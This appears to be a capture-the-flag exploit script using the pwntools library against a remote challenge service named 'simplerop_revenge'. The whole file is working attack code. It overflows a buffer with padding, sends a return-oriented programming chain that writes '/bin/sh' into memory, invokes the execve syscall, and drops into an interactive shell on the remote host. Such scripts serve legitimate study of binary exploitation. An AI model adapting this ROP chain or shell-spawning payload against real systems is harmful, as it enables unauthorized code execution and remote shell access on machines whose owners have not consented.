# -*- coding: utf-8 -*-
from pwn import *
context.arch = "amd64"

host, port = 'csie.ctf.tw', 10130
p = remote(host, port)
#p = process('./simplerop_revenge-a94df6520a6dbe478b5a03fd31e0b0614bcdf08d')

payload = "a"*40

# Write /bin/sh
mov_prdi_rsi = 0x000000000047a502
pop_rdi = 0x0000000000401456
pop_rsi = 0x0000000000401577
buf = 0x6c9a20
pop_rax_rdx_rbx = 0x0000000000478516
syscall = 0x00000000004671b5

rop = flat([
    pop_rdi, buf, pop_rsi, "/bin/sh\x00", mov_prdi_rsi,
    pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0,
    syscall
])

p.recvuntil(":")
p.sendline(payload + rop)
p.interactive()
